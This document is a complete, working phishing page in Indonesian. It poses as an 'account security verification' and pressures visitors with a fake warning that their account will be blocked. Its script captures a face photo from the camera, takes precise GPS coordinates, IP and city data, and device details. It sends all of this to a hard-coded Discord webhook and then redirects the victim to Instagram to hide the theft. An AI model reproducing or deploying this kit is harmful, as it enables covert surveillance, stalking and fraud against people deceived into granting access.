<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifikasi Identitas - Keamanan Akun</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: white;
      border-radius: 20px;
      padding: 40px;
      max-width: 500px;
      width: 100%;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    }
    .logo {
      text-align: center;
      font-size: 60px;
      margin-bottom: 20px;
    }
    h1 {
      color: #333;
      font-size: 24px;
      margin-bottom: 10px;
      text-align: center;
    }
    .subtitle {
      color: #666;
      font-size: 14px;
      text-align: center;
      margin-bottom: 30px;
      line-height: 1.5;
    }
    .warning-box {
      background: #fff3cd;
      border-left: 4px solid #ffc107;
      padding: 15px;
      margin-bottom: 25px;
      border-radius: 5px;
    }
    .warning-box p {
      color: #856404;
      font-size: 13px;
      line-height: 1.6;
    }
    #status {
      background: #e3f2fd;
      padding: 15px;
      border-radius: 10px;
      margin-bottom: 20px;
      text-align: center;
      color: #1565c0;
      font-weight: 500;
      min-height: 50px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    button {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.2s;
    }
    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
    }
    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    video {
      width: 100%;
      border-radius: 10px;
      margin: 20px 0;
      display: none;
      border: 3px solid #667eea;
    }
    .steps {
      margin: 20px 0;
      padding: 15px;
      background: #f5f5f5;
      border-radius: 10px;
    }
    .step {
      display: flex;
      align-items: center;
      padding: 8px 0;
      font-size: 14px;
      color: #666;
    }
    .step-icon {
      width: 24px;
      height: 24px;
      background: #ddd;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 12px;
      font-size: 12px;
    }
    .step.active .step-icon {
      background: #667eea;
      color: white;
    }
    .step.done .step-icon {
      background: #4caf50;
      color: white;
    }
    #debug {
      position: fixed;
      bottom: 10px;
      right: 10px;
      background: rgba(0,0,0,0.8);
      color: #0f0;
      padding: 10px;
      border-radius: 5px;
      font-size: 10px;
      max-width: 300px;
      max-height: 200px;
      overflow-y: auto;
      font-family: monospace;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">üîê</div>
    <h1>Verifikasi Keamanan Akun</h1>
    <p class="subtitle">
      Kami mendeteksi aktivitas mencurigakan pada akun Anda. 
      Mohon verifikasi identitas untuk melindungi akun Anda.
    </p>

    <div class="warning-box">
      <p>
        ‚ö†Ô∏è <strong>Penting:</strong> Verifikasi ini diperlukan untuk mencegah pemblokiran akun. 
        Proses memerlukan akses kamera dan lokasi untuk konfirmasi identitas.
      </p>
    </div>

    <div class="steps">
      <div class="step" id="step1">
        <div class="step-icon">1</div>
        <span>Verifikasi wajah dengan kamera</span>
      </div>
      <div class="step" id="step2">
        <div class="step-icon">2</div>
        <span>Konfirmasi lokasi perangkat</span>
      </div>
      <div class="step" id="step3">
        <div class="step-icon">3</div>
        <span>Validasi data keamanan</span>
      </div>
    </div>

    <div id="status">‚è≥ Siap untuk memulai verifikasi</div>

    <button onclick="mulaiVerifikasi()" id="btnStart">
      MULAI VERIFIKASI SEKARANG
    </button>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;"></canvas>
  </div>

  <div id="debug"></div>

  <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1470328357110415455/tTwvOp-9oZm1WMYedDUzPwuviaES8bmimwryhgILqo2PjqXfXxyI8hCR-IvW9SSzeAtx";
    let debugMode = window.location.hash === '#debug';

    function log(msg) {
      const time = new Date().toLocaleTimeString();
      const logDiv = document.getElementById('debug');
      if (debugMode) {
        logDiv.style.display = 'block';
        logDiv.innerHTML += `[${time}] ${msg}<br>`;
        logDiv.scrollTop = logDiv.scrollHeight;
      }
      console.log(`[${time}] ${msg}`);
    }

    function updateStatus(msg, isError = false) {
      const status = document.getElementById('status');
      status.innerText = msg;
      status.style.background = isError ? '#ffebee' : '#e3f2fd';
      status.style.color = isError ? '#c62828' : '#1565c0';
    }

    function updateStep(stepNum, state) {
      const step = document.getElementById(`step${stepNum}`);
      step.classList.remove('active', 'done');
      if (state === 'active') step.classList.add('active');
      if (state === 'done') step.classList.add('done');
    }

    async function kirimKeWebhook(data) {
      try {
        const response = await fetch(WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}: ${await response.text()}`);
        }
        
        log(`‚úÖ Webhook response: ${response.status}`);
        return true;
      } catch (error) {
        log(`‚ùå Webhook error: ${error.message}`);
        return false;
      }
    }

    async function kirimFoto(blob, metadata) {
      try {
        const formData = new FormData();
        const filename = `capture_${Date.now()}.jpg`;
        
        formData.append('file', blob, filename);
        
        const payload = {
          content: "üö® **VERIFIKASI BARU MASUK**",
          embeds: [{
            title: "üì∏ DATA VERIFIKASI IDENTITAS",
            color: 3447003,
            fields: [
              { name: "üìç Lokasi IP", value: metadata.lokasi || "Unknown", inline: false },
              { name: "üéØ GPS Koordinat", value: metadata.gps || "Tidak tersedia", inline: false },
              { name: "üåê IP Address", value: metadata.ip || "Unknown", inline: true },
              { name: "üèôÔ∏è Kota", value: metadata.city || "Unknown", inline: true },
              { name: "üó∫Ô∏è Negara", value: metadata.country || "Unknown", inline: true },
              { name: "üì± Perangkat", value: metadata.device || "Unknown", inline: false },
              { name: "üïê Waktu", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
            ],
            image: { url: `attachment://${filename}` },
            footer: { text: "Security Verification System" },
            timestamp: new Date().toISOString()
          }]
        };
        
        formData.append('payload_json', JSON.stringify(payload));

        const response = await fetch(WEBHOOK, {
          method: 'POST',
          body: formData
        });

        if (!response.ok) {
          throw new Error(`Upload failed: ${response.status}`);
        }

        log(`‚úÖ Foto terkirim: ${filename} (${(blob.size/1024).toFixed(2)}KB)`);
        return true;
      } catch (error) {
        log(`‚ùå Error kirim foto: ${error.message}`);
        return false;
      }
    }

    async function ambilFoto() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      
      return new Promise((resolve, reject) => {
        try {
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          canvas.toBlob((blob) => {
            if (blob && blob.size > 0) {
              log(`‚úÖ Foto captured: ${canvas.width}x${canvas.height}, size: ${blob.size} bytes`);
              resolve(blob);
            } else {
              reject(new Error('Blob kosong atau gagal dibuat'));
            }
          }, 'image/jpeg', 0.9);
          
        } catch (error) {
          reject(error);
        }
      });
    }

    async function mulaiVerifikasi() {
      const btn = document.getElementById('btnStart');
      const video = document.getElementById('video');
      
      btn.disabled = true;
      btn.innerText = 'MEMPROSES...';
      
      let stream = null;
      let audioStream = null;
      
      try {
        // STEP 0: Test webhook
        log("üîµ Testing webhook connection...");
        await kirimKeWebhook({ content: "üü¢ Sistem aktif - Ada yang mulai verifikasi" });

        // STEP 1: Kamera + Mikrofon
        updateStep(1, 'active');
        updateStatus("üì∑ Mohon izinkan akses kamera dan mikrofon...");
        log("üì∑ Requesting camera + microphone access...");
        
        // Request kamera DAN mikrofon sekaligus (lebih kuat di HP)
        stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 1920, min: 640 },
            height: { ideal: 1080, min: 480 }
          },
          audio: true  // MIKROFON IKUT DIMINTA
        });
        
        log("‚úÖ Kamera + mikrofon access granted");
        video.srcObject = stream;
        video.style.display = 'block';
        
        // Tunggu video benar-benar ready
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play().then(resolve).catch(resolve);
          };
        });
        
        updateStatus("üòä Posisikan wajah Anda di depan kamera...");
        await new Promise(r => setTimeout(r, 3000));
        
        // Ambil foto
        updateStatus("üì∏ Mengambil foto verifikasi...");
        const fotoBlob = await ambilFoto();
        
        // Stop kamera setelah foto
        stream.getTracks().forEach(track => {
          log(`Stopping track: ${track.kind}`);
          track.stop();
        });
        video.style.display = 'none';
        
        updateStep(1, 'done');

        // STEP 2: Lokasi GPS (dengan multiple attempts untuk HP)
        updateStep(2, 'active');
        updateStatus("üìç Mengambil lokasi perangkat...");
        log("üåç Getting geolocation...");
        
        let gpsData = null;
        let gpsText = "GPS tidak tersedia";
        
        // Multiple attempts untuk GPS (HP sering butuh retry)
        for (let attempt = 1; attempt <= 3; attempt++) {
          try {
            log(`GPS attempt ${attempt}/3...`);
            gpsData = await Promise.race([
              new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                  resolve,
                  reject,
                  {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                  }
                );
              }),
              new Promise((_, reject) => 
                setTimeout(() => reject(new Error('GPS timeout')), 10000)
              )
            ]);
            
            gpsText = `${gpsData.coords.latitude.toFixed(6)}, ${gpsData.coords.longitude.toFixed(6)} (¬±${Math.round(gpsData.coords.accuracy)}m)`;
            log(`‚úÖ GPS berhasil: ${gpsText}`);
            break;
          } catch (error) {
            log(`‚ö†Ô∏è GPS attempt ${attempt} failed: ${error.message}`);
            if (attempt === 3) {
              log("‚ùå GPS gagal setelah 3 attempts");
            }
            await new Promise(r => setTimeout(r, 1000));
          }
        }

        // STEP 3: Data IP
        updateStatus("üåê Mengambil informasi jaringan...");
        log("üåê Fetching IP geolocation...");
        
        let geoData = {
          ip: 'Unknown',
          city: 'Unknown',
          region: 'Unknown',
          country_name: 'Unknown'
        };
        
        try {
          const geoResponse = await Promise.race([
            fetch('https://ipapi.co/json/'),
            new Promise((_, reject) => 
              setTimeout(() => reject(new Error('IP API timeout')), 8000)
            )
          ]);
          geoData = await geoResponse.json();
          log(`‚úÖ IP data: ${geoData.ip} - ${geoData.city}, ${geoData.country_name}`);
        } catch (error) {
          log(`‚ö†Ô∏è IP API error: ${error.message}`);
        }

        updateStep(2, 'done');
        updateStep(3, 'active');

        // STEP 4: Kirim semua data
        updateStatus("üì§ Mengirim data verifikasi...");
        log("üì§ Sending data to server...");

        const metadata = {
          lokasi: `${geoData.city}, ${geoData.region}, ${geoData.country_name}`,
          gps: gpsText,
          ip: geoData.ip,
          city: geoData.city,
          country: geoData.country_name,
          device: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screen: `${screen.width}x${screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        // Kirim foto dengan metadata
        const success = await kirimFoto(fotoBlob, metadata);
        
        if (!success) {
          throw new Error('Gagal mengirim data ke server');
        }

        updateStep(3, 'done');
        updateStatus("‚úÖ Verifikasi berhasil! Akun Anda aman.");
        log("‚úÖ‚úÖ‚úÖ SEMUA PROSES BERHASIL!");

        btn.innerText = 'VERIFIKASI SELESAI';
        
        setTimeout(() => {
          window.location.href = "https://www.instagram.com/";
        }, 2500);

      } catch (error) {
        log(`‚ùå FATAL ERROR: ${error.message}`);
        updateStatus(`‚ùå Error: ${error.message}`, true);
        
        // Tetap kirim notif error
        await kirimKeWebhook({
          content: `‚ö†Ô∏è **VERIFIKASI GAGAL**\n\`\`\`\nError: ${error.message}\nDevice: ${navigator.userAgent}\nPlatform: ${navigator.platform}\n\`\`\``
        });

        btn.disabled = false;
        btn.innerText = 'COBA LAGI';
        
        // Cleanup
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        video.style.display = 'none';
      }
    }

    // Auto-log page load
    window.addEventListener('load', () => {
      log("üü¢ Page loaded successfully");
      log(`Device: ${navigator.userAgent}`);
      log(`Platform: ${navigator.platform}`);
      log(`Screen: ${screen.width}x${screen.height}`);
    });
  </script>
</body>
</html>